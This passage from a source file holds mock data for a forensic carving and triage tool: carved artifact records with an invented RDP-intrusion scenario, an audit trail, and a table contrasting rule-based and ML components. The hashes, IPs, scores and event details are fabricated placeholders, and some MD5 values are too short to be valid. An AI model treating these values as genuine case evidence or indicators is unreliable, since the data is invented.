    relatedArtifacts: [
      { id: "ART-1052", name: "carved_sec_0068D100_vssadmin.bat", relation: "Same Stager Session", score: 97.3 }
    ]
  },
  {
    id: "ART-1081",
    filename: "carved_sec_008FA000_network_topology.png",
    type: "Photos",
    classificationConfidence: 92.4,
    integrity: 45.0,
    corruption: "IDAT chunk decompression error / Missing IEND trailer",
    evidenceRelevance: 70.0,
    duplicate: false,
    priorityScore: 61.2,
    priorityTier: "Medium",
    reason: "Internal network topology schematic screenshot. Partial zlib decompression recovered header.",
    metadata: {
      size: "94,200 bytes",
      sha256: "0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20",
      md5: "8899aabbccddeeff",
      ssdeep: "768:44321...:443",
      timestamps: {
        carved: "2026-09-25T10:14:33Z",
        inferredMtime: "2026-09-24T14:40:00Z",
        incidentWindowMatch: true,
      },
      sourceOffset: "0x008FA000",
      sector: "Sector 9,412,608",
      mimeType: "image/png",
    },
    classificationExplanation: {
      label: "Portable Network Graphics (PNG)",
      confidence: 92.4,
      method: "Rule-based 8-byte PNG header check (89 50 4E 47 0D 0A 1A 0A)",
      signals: [
        "Rule Match: Valid PNG magic 8-byte signature",
        "IHDR chunk valid: 1920x1080 TrueColor 8-bit",
        "Zlib decompression failed at stream offset 0x8200"
      ],
      conflicts: "None"
    },
    integrityAnalysis: {
      percentComplete: 45,
      corruptionType: "Missing IEND footer, CRC checksum mismatch on 3rd IDAT chunk",
      missingData: "Lower 55% pixel rows corrupted by slack unallocated sector overwrite."
    },
    recoveryInfo: {
      sourceFragments: ["Frag-008FA000"],
      carvingConfidence: 81.0,
      fragmentationStatus: "Single Block (Premature IDAT Term)"
    },
    priorityExplanation: {
      relevanceContrib: 28.0,
      integrityContrib: 13.5,
      recencyContrib: 14.2,
      uniquenessContrib: 5.5,
      total: 61.2
    },
    preview: {
      kind: "image",
      imageUrl: "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?auto=format&fit=crop&w=600&q=80",
      caption: "Recovered network architecture Visio capture (45% scanline reconstruction)",
      exif: {
        dimensions: "1920x1080",
        depth: "24-bit TrueColor",
        source: "Win32 Screen Snip cache"
      }
    },
    hexDump: `00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
00000010  00 00 07 80 00 00 04 38  08 02 00 00 00 e8 8c 47  |.......8.......G|`,
    relatedArtifacts: []
  },
  {
    id: "ART-1019",
    filename: "carved_sec_0009D000_event_4624_logon.evtx",
    type: "DB log",
    classificationConfidence: 98.7,
    integrity: 96.0,
    corruption: "Minor chunk header timestamp drift",
    evidenceRelevance: 88.0,
    duplicate: false,
    priorityScore: 88.5,
    priorityTier: "High",
    reason: "Windows Security Event Log showing Event ID 4624 (Successful Type 10 RDP Logon) from attacker IP.",
    metadata: {
      size: "65,536 bytes",
      sha256: "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899",
      md5: "0011223344556677",
      ssdeep: "384:8899aa...:889",
      timestamps: {
        carved: "2026-09-25T10:14:14Z",
        inferredMtime: "2026-09-24T17:02:11Z",
        incidentWindowMatch: true,
      },
      sourceOffset: "0x0009D000",
      sector: "Sector 643,072",
      mimeType: "application/x-ms-evtx",
    },
    classificationExplanation: {
      label: "Windows XML Event Log (EVTX 2.0)",
      confidence: 98.7,
      method: "Rule-based 'ElfFile' magic bytes (45 6C 66 46 69 6C 65 00)",
      signals: [
        "Rule Match: ElfFile header marker and chunk checksum valid",
        "Extracted 42 Binary XML records",
        "Found Event 4624: TargetUserName 'svc_backup', IpAddress '198.51.100.24'"
      ],
      conflicts: "None"
    },
    integrityAnalysis: {
      percentComplete: 96,
      corruptionType: "Last record header flags corrupted",
      missingData: "Record 43 truncated at file carving boundary."
    },
    recoveryInfo: {
      sourceFragments: ["Frag-0009D000"],
      carvingConfidence: 97.2,
      fragmentationStatus: "Single Block"
    },
    priorityExplanation: {
      relevanceContrib: 35.2,
      integrityContrib: 28.8,
      recencyContrib: 17.5,
      uniquenessContrib: 7.0,
      total: 88.5
    },
    preview: {
      kind: "db",
      tableName: "Security.evtx Events",
      columns: ["RecordID", "EventID", "TimeCreated", "Account", "LogonType", "SourceNetworkAddress"],
      rows: [
        ["89201", "4624", "2026-09-24 16:59:02", "SYSTEM", "0", "-"],
        ["89202", "4624", "2026-09-24 17:02:11", "svc_backup", "10 (RDP)", "198.51.100.24"],
        ["89203", "4672", "2026-09-24 17:02:12", "svc_backup", "Privilege Assigned", "SeDebugPrivilege"],
        ["89204", "7045", "2026-09-24 17:05:40", "svc_backup", "New Service Installed", "srv_backdoor.exe"]
      ]
    },
    hexDump: `00000000  45 6c 66 46 69 6c 65 00  00 00 00 00 00 00 00 00  |ElfFile.........|
00000010  01 00 00 00 01 00 00 00  80 00 01 00 00 00 00 00  |................|`,
    relatedArtifacts: [
      { id: "ART-1088", name: "carved_sec_009B2000_auth_sessions.sqlite", relation: "Correlated Session Login", score: 92.4 }
    ]
  },
  {
    id: "ART-1008",
    filename: "carved_sec_0002A000_ntuser_registry_hive.dat",
    type: "System trace",
    classificationConfidence: 93.5,
    integrity: 85.0,
    corruption: "HBASE block checksum error, cell list partially intact",
    evidenceRelevance: 55.0,
    duplicate: false,
    priorityScore: 62.0,
    priorityTier: "Medium",
    reason: "User registry hive fragment containing MRU Run list and TypedPaths.",
    metadata: {
      size: "24,576 bytes",
      sha256: "33221100ffeeddccbbaa99887766554433221100ffeeddccbbaa998877665544",
      md5: "7766554433221100",
      ssdeep: "192:12345...:123",
      timestamps: {
        carved: "2026-09-25T10:14:08Z",
        inferredMtime: "2026-09-23T11:20:00Z",
        incidentWindowMatch: false,
      },
      sourceOffset: "0x0002A000",
      sector: "Sector 172,032",
      mimeType: "application/x-windows-registry",
    },
    classificationExplanation: {
      label: "Windows NT Registry Hive (regf)",
      confidence: 93.5,
      method: "Rule-based 'regf' header signature (72 65 67 66)",
      signals: ["Rule Match: 'regf' magic bytes", "Found hbin cell structures"],
      conflicts: "None"
    },
    integrityAnalysis: {
      percentComplete: 85,
      corruptionType: "HBASE block checksum error",
      missingData: "Unallocated cell list broken."
    },
    recoveryInfo: {
      sourceFragments: ["Frag-0002A000"],
      carvingConfidence: 89.2,
      fragmentationStatus: "Single Block"
    },
    priorityExplanation: {
      relevanceContrib: 22.0,
      integrityContrib: 25.5,
      recencyContrib: 6.5,
      uniquenessContrib: 8.0,
      total: 62.0
    },
    preview: {
      kind: "text",
      highlightedTokens: ["TypedPaths", "RunMRU", "powershell.exe"],
      content: `[Registry Cell Extract: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU]
a: cmd.exe /c start powershell.exe\\1
b: taskmgr.exe\\1
c: regedit.exe\\1
MRUList: abc`
    },
    hexDump: `00000000  72 65 67 66 01 00 00 00  00 00 00 00 00 00 00 00  |regf............|`,
    relatedArtifacts: []
  },
  {
    id: "ART-1002",
    filename: "carved_sec_0000F000_unallocated_slack.raw",
    type: "Unknown/Fragment",
    classificationConfidence: 51.2,
    integrity: 20.0,
    corruption: "Unstructured zero-padded slack sector",
    evidenceRelevance: 12.0,
    duplicate: false,
    priorityScore: 18.5,
    priorityTier: "Low",
    reason: "Low entropy unstructured slack fragment with no identifiable format or forensic IOCs.",
    metadata: {
      size: "512 bytes",
      sha256: "00000000111122223333444455556666777788889999aaaabbbbccccddddeeee",
      md5: "1234567890abcdef",
      ssdeep: "6:aa...:a",
      timestamps: {
        carved: "2026-09-25T10:14:03Z",
        inferredMtime: "1970-01-01T00:00:00Z",
        incidentWindowMatch: false,
      },
      sourceOffset: "0x0000F000",
      sector: "Sector 61,440",
      mimeType: "application/octet-stream",
    },
    classificationExplanation: {
      label: "Unclassified Slack Space",
      confidence: 51.2,
      method: "ML Gradient Boosting on Raw Byte Entropy (Entropy: 1.14)",
      signals: ["High concentration of 0x00 and 0xFF padding", "Zero signature match"],
      conflicts: "No recognizable file grammar or headers"
    },
    integrityAnalysis: {
      percentComplete: 20,
      corruptionType: "Orphaned slack fragment",
      missingData: "Isolated 512-byte disk cluster."
    },
    recoveryInfo: {
      sourceFragments: ["Frag-0000F000"],
      carvingConfidence: 45.0,
      fragmentationStatus: "Orphaned Sector"
    },
    priorityExplanation: {
      relevanceContrib: 4.8,
      integrityContrib: 6.0,
      recencyContrib: 2.0,
      uniquenessContrib: 5.7,
      total: 18.5
    },
    preview: {
      kind: "hex",
      highlightedTokens: ["0x00 Null Slack"],
      content: `00000000: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000010: 00 00 00 00 00 00 00 00  53 4c 41 43 4b 5f 5a 45  ........SLACK_ZE
00000020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................`
    },
    hexDump: `00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|`,
    relatedArtifacts: []
  }
];

// Audit trail conforming to mandatory security/forensics controls
export const INITIAL_AUDIT_LOG = [
  {
    id: "AUDIT-001",
    timestamp: "2026-09-25T10:14:02.104Z",
    stage: "Ingest & Cryptographic Sealing",
    artifact: "SOURCE_IMAGE_RAW",
    inputHash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    output: "Read-only loop mount initialized. Working copy verified identical (Bit-stream copy, 0 delta).",
    actor: "SAMDHAN-Core-Daemon v2.4",
    modelOrRule: "Crypto-SHA256 (Rule-based exact)",
    status: "SEALED"
  },
  {
    id: "AUDIT-002",
    timestamp: "2026-09-25T10:14:05.819Z",
    stage: "Feature Extraction",
    artifact: "48 Unallocated Sectors",
    inputHash: "b4c29d10e8d0e514f7b231a44e55e347712399a9b0c2d3e4f5a6b7c8d9e0f1a2",
    output: "Extracted Shannon entropy, byte-frequency histograms, n-grams, and header signatures.",
    actor: "FeatureExtractorWorker-1",
    modelOrRule: "Shannon-Entropy-Alg-v1.2 (Algorithmic)",
    status: "VERIFIED"
  },
  {
    id: "AUDIT-003",
    timestamp: "2026-09-25T10:14:12.301Z",
    stage: "Classification",
    artifact: "ART-1049 (carved_sec_004F3A20)",
    inputHash: "b4c29d10e8d0e514f7b231a44e55e347712399a9b0c2d3e4f5a6b7c8d9e0f1a2",
    output: "Classified as Ransomware Note (Confidence: 98.4%)",
    actor: "Classifier-Engine",
    modelOrRule: "GradientBoostingClassifier-v2.1 + Rule-based MIME",
    status: "VERIFIED"
  },
  {
    id: "AUDIT-004",
    timestamp: "2026-09-25T10:14:15.910Z",
    stage: "Integrity & Structural Checks",
    artifact: "ART-1088 (carved_sec_009B2000)",
    inputHash: "e4a28f1105c317b9d3e81745aa6212b4e578491c120bfec211029177a8349bb1",
    output: "SQLite header valid (4096 page size). B-Tree Leaf Page Corrupted at offset 0x0C000.",
    actor: "SQLiteStructureValidator",
    modelOrRule: "Rule-based SQLite3 Format Spec (Exact)",
    status: "VERIFIED"
  },
  {
    id: "AUDIT-005",
    timestamp: "2026-09-25T10:14:19.440Z",
    stage: "Deduplication & Fuzzy Hashing",
    artifact: "ART-1032 (carved_sec_0011B800)",
    inputHash: "1928374a5b6c7d8e9f0123456789abcdef0123456789abcdef0123456789abcd",
    output: "Flagged as duplicate of ART-1031. SSDEEP similarity score: 100%. Priority penalty applied.",
    actor: "DedupEngine",
    modelOrRule: "SHA-256 Exact + SSDEEP Fuzzy Hash",
    status: "FLAGGED_DUP"
  },
  {
    id: "AUDIT-006",
    timestamp: "2026-09-25T10:14:24.012Z",
    stage: "Evidence Relevance Scoring",
    artifact: "ART-1049 & ART-1052",
    inputHash: "c18f3a9e2d1400ba589410efb817c7e5a0139b81f9a2e6f212356c9d0124fe78",
    output: "IOC match against breach window and threat actor IP 198.51.100.24. Assigned CRITICAL tier.",
    actor: "RelevanceScorer",
    modelOrRule: "spaCy NER + Regex IOC Matcher (Combined)",
    status: "ESCALATED"
  }
];

// Architecture mapping conforming to Section 10: AI vs Rule-Based Logic
export const AI_VS_RULE_MATRIX = [
  {
    component: "Magic-byte / signature detection",
    approach: "Rule-based",
    tooling: "libmagic / binary header offset table",
    why: "Deterministic, well-defined format specs — ML adds no value and less trust."
  },
  {
    component: "MIME validation",
    approach: "Rule-based",
    tooling: "python-magic / libmagic",
    why: "MIME standards are deterministic RFC specs."
  },
  {
    component: "Cryptographic Hashing & Dedup",
    approach: "Rule-based",
    tooling: "SHA-256 / MD5",
    why: "Cryptographic verification must be exact and court-admissible with zero tolerance for probabilistic variance."
  },
  {
    component: "Integrity / structural checks",
    approach: "Rule-based",
    tooling: "Pillow, PyPDF2, sqlite3, libpcap parsers",
    why: "File-format specs are checkable exactly. A wrong 'AI guess' about corruption damages forensic credibility."
  },
  {
    component: "Near-duplicate / cluster detection",
    approach: "Rule-based + Light Algorithmic",
    tooling: "Exact hash + ssdeep / tlsh similarity thresholds",
    why: "Exact dedup must be exact; near-duplicate detection benefits from algorithmic similarity distance."
  },
  {
    component: "Known log-pattern detection",
    approach: "Rule-based",
    tooling: "Regex / RFC-3164 Syslog & Auth grammar",
    why: "Standard formats are well-documented; regex is faster, auditable, and judge-defensible."
  },
  {
    component: "Unknown / ambiguous fragment classification",
    approach: "Machine Learning (ML)",
    tooling: "scikit-learn GradientBoosting on byte/entropy features",
    why: "No reliable signature exists. This is genuinely a pattern-recognition problem over byte-entropy distributions."
  },
  {
    component: "Content-based semantic classification",
    approach: "ML / NLP",
    tooling: "spaCy NER + contextual keyword embedding",
    why: "'Is this about the incident?' is a natural language understanding task, impossible to hardcode exhaustively."
  },
  {
    component: "Evidence relevance estimation",
    approach: "ML / NLP",
    tooling: "Contextual relevance model + Incident window scorer",
    why: "Requires interpreting free text against dynamic case context and investigator timeline."
  },
  {
    component: "Non-contiguous fragment clustering",
    approach: "Light ML / Algorithmic",
    tooling: "Similarity hashing + statistical n-gram continuity",
    why: "Content similarity across disjointed sectors cannot be expressed through static offset rules."
  }
];
